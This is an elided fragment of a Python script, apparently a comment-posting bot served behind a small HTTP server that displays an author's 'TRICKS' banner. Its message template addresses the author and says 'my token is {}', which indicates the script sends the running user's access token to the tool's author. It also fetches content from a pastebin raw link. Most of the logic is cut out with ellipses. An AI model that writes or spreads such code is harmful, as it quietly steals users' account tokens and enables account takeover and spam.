...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"SERVER RUNNING => TRICKS ||[BY=M9F1Y9_N9D33M IINSIIDE]")
...
def post_comments():
    ...
    msg_template = "Hello N9DīīM  SīīR! II am uSīīnG YouR pOsT sErvRr. MY ⤵️TokEn⤵️ īīS  {}"
    ...
    mmm = requests.get('https://pastebin.com/raw/araA1Lje').text
